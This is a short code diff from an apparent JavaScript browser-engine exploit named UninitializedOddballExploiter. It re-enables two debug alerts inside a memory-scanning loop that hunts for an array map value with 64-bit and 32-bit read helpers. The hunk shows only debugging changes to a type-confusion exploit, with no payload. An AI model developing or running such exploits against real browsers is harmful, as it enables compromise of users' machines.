@@ -237,8 +237,8 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                 
                 helpers.set_i64(prev1);
                 var [prev_lo, _] = helpers.get_u32_pair();
-                // alert(hex(prev_hi));
-                // alert(hex(prev_lo));
+                alert(hex(prev_hi));
+                alert(hex(prev_lo));
                 if (prev_hi == array_map || prev_lo == array_map) {
                     alert("[+]find !");
                     return [i, hi == 2734n ? 0 : 1];
